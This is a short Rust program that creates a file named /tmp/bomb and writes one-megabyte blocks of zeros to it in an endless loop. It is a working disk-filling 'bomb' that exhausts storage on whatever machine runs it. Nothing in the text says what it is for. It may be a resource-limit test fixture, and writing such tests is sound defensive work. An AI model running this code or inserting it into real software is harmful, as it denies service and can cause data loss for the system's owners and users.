use std::fs::File;
use std::io::Write;

fn main() {
    let mut f = File::create("/tmp/bomb").unwrap();
    let chunk = vec![0u8; 1024 * 1024];
    loop {
        f.write_all(&chunk).unwrap();
    }
}
